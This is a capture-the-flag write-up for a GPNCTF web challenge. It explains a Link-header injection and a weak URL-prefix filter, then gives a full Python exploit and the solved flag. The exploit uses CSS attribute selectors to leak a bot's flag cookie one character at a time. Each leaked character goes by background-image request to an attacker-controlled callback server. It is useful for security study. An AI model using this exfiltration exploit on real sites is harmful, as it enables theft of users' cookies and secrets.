# Tiny Web Write up

## 1. Code Analyze

Beautifying index.js
```javascript
require('http').createServer((a, b) => b.writeHead(200, {
    'content-type': 'text/html',
    link: `<${unescape(a.url)}>;rel=preload;as=fetch`
}) + b.end(`<body onload=fetch('${a.headers.cookie}')>`)).listen(8080)
```

- The entire request URL goes into the URI portion of the Link header.
- Special characters can be inserted because of `unescape()`.

Thus, if we construct a payload like this:
```javascript
///[My IP]/exploit.css>;rel=stylesheet, <http://localhost:8080/dummy
```

Request header will be 
```javascript
Link: <///attacker/exploit.css>;rel=stylesheet, <http://localhost:8080/dummy>;rel=preload;as=fetch
```
This demonstrates that we can force the loading of an arbitrary external stylesheet.

---

admin.js
```javascript
app.get('/bot/run', async (req, res) => {
    const targetUrl = req.query.url
    if (typeof targetUrl === 'string' && !targetUrl.startsWith('http://localhost:8080')) {
        return res.send('invalid url')
    }
...
            browser = await firefox.launch(launchOptions)

            const page = await browser.newPage()
            await page.goto('http://localhost:8080', {waitUntil: 'domcontentloaded'});
            await page.evaluate(flag => document.cookie = "flag="+flag, process.env.FLAG)
...
    return res.send('ok')
})
```

- The bot stores the flag in its cookie, matching the pattern `flag=GPNCTF{...}.`
- The bot revisits the index.js page with the flag cookie.
    - When the bot contains the flag cookie, the DOM will render as `<body onload="fetch('flag=GPNCTF{...}')">`. This value can be prefix-matched using the CSS attribute selector `body[onload^="..."]`.
- There is a URL filter, but it only checks whether targetUrl starts with `http://localhost:8080`
    - We can bypass this filter by prepending http://localhost:8080 to the exploit payload.

---

## 2. Exploit
Since the bot only allows URLs starting with `http://localhost:8080`, the payload must be structured as follows:
`http://localhost:8080///[My IP]/exploit.css?step=1>;rel=stylesheet, <http://localhost:8080/dummy`

### Flow:
1. The bot requests the payload URL.
2. `index.js` receives `///[My IP]/exploit.css?step=1...` as the request path (`a.url`).
3. This value is reflected in the HTTP Link header: 
   `Link: <///[My IP]/exploit.css?step=1>;rel=stylesheet, <http://localhost:8080/dummy>;rel=preload;as=fetch`
4. Firefox parses `///[My IP]/...` by ignoring the first slash and treating it as a protocol-relative URL (`//[My IP]/...`), resolving it to `http://[My IP]/exploit.css` and loading the external stylesheet.
5. The loaded CSS inspects the `body[onload]` value.
6. A `/leak?char=...` request is sent to my server when a character matches.

### payload
``` python
import argparse
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import requests


CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-="
PREFIX = "fetch('flag=GPNCTF{"


def escape_css(value: str) -> str:
    return value.replace("\\", "\\\\").replace('"', '\\"')


def normalize_bot_url(bot: str) -> str:
    bot = bot.rstrip("/")
    return bot if bot.endswith(("/bot/run", "/run")) else f"{bot}/bot/run"


def parse_callback(callback: str) -> tuple[int, str]:
    parts = urllib.parse.urlsplit(callback if "://" in callback else f"http://{callback}")
    if not parts.netloc or parts.query or parts.fragment:
        raise ValueError("invalid callback URL")
    port = parts.port or (443 if parts.scheme == "https" else 80)
    return port, f"{parts.netloc}{parts.path.rstrip('/')}"


class State:
    def __init__(self, callback: str) -> None:
        self.callback = callback.rstrip("/")
        self.prefix = PREFIX
        self.step = 0
        self.resolved = 0
        self.last = ""
        self.event = threading.Event()
        self.lock = threading.Lock()

    def start(self, step: int) -> None:
        with self.lock:
            self.step = step
            self.last = ""
            self.event.clear()

    def css(self, step: int) -> bytes:
        with self.lock:
            prefix = self.prefix

        body = []
        for ch in CHARS:
            leak = f"{self.callback}/leak?step={step}&char={urllib.parse.quote(ch, safe='')}"
            body.append(
                f'body[onload^="{escape_css(prefix + ch)}"]{{background-image:url("{leak}") !important;}}\n'
            )
        return "".join(body).encode()

    def leak(self, step: int, ch: str) -> bool:
        with self.lock:
            if len(ch) != 1 or step != self.step or step == self.resolved:
                return False
            self.prefix += ch
            self.last = ch
            self.resolved = step
            self.event.set()
            return True

    def wait(self, timeout: float) -> str | None:
        if not self.event.wait(timeout):
            return None
        with self.lock:
            return self.last


def make_handler(state: State) -> type[BaseHTTPRequestHandler]:
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self) -> None:
            parsed = urllib.parse.urlsplit(self.path)

            if parsed.path.endswith("/exploit.css"):
                try:
                    step = int(urllib.parse.parse_qs(parsed.query).get("step", ["0"])[0])
                except ValueError:
                    step = 0
                body = state.css(step)
                self.send_response(200)
                self.send_header("Content-Type", "text/css; charset=utf-8")
                self.send_header("Cache-Control", "no-store, max-age=0")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return

            if parsed.path.endswith("/leak"):
                params = urllib.parse.parse_qs(parsed.query)
                try:
                    step = int(params.get("step", ["0"])[0])
                except ValueError:
                    step = 0
                ch = params.get("char", [""])[0]
                if state.leak(step, ch):
                    print(f"[LEAK] step={step} char={ch} prefix={state.prefix}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"ok")
                return

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")

        def log_message(self, format: str, *args) -> None:
            return

    return Handler


def build_target(callback: str, step: int, attempt: int) -> str:
    return (
        f"http://localhost:8080///{callback}/exploit.css?step={step}&attempt={attempt}>;rel=stylesheet, "
        f"<http://localhost:8080/dummy"
    )


def trigger(bot_url: str, target: str, timeout: float) -> str:
    return requests.get(bot_url, params={"url": target}, timeout=timeout).text.strip()


parser = argparse.ArgumentParser()
parser.add_argument("--bot", required=True)
parser.add_argument("--callback", required=True)
args = parser.parse_args()

port, callback_base = parse_callback(args.callback)
bot_url = normalize_bot_url(args.bot)
state = State(args.callback)
server = ThreadingHTTPServer(("0.0.0.0", port), make_handler(state))
threading.Thread(target=server.serve_forever, daemon=True).start()

print(f"[+] callback server: 0.0.0.0:{port}")

for step in range(1, 129):
    state.start(step)
    found = None

    for attempt in range(1, 4):
        target = build_target(callback_base, step, attempt)
        print(f"[+] step={step} attempt={attempt} target={target}")

        while True:
            result = trigger(bot_url, target, 45.0)
            if result != "pls wait":
                break
            time.sleep(2)

        if result == "invalid url":
            print("[-] bot rejected payload")
            break

        found = state.wait(10.0)
        if found is not None:
            break

        print(f"[*] no leak for step={step} attempt={attempt}, retrying")
    else:
        print(f"[-] no leak for step={step} prefix={state.prefix}")
        break

    if result == "invalid url":
        break

    print(f"[+] step={step} char={found} prefix={state.prefix}")
    if found == "}":
        break
```

## 3. Flag
`GPNCTF{codE_601f_IS_fUn__fiREfoX_FEatUres_To0}`